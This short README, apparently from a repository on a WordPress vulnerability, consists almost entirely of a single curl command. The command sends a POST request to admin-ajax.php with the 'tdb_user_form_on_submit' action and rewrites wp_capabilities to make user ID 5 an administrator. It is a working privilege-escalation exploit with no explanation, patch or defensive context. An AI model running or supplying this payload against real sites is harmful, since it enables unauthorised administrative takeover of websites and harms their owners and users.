# Issue-In-Wordpress-data-
` To set the user with ID 5 to an administrator:



curl -X POST --data 'action=tdb_user_form_on_submit&userID=5&formElements={"content-fields":[{"name":"wp_capabilities","value":{"administrator":true}}]}' https://example.com/wp-admin/admin-ajax.php `
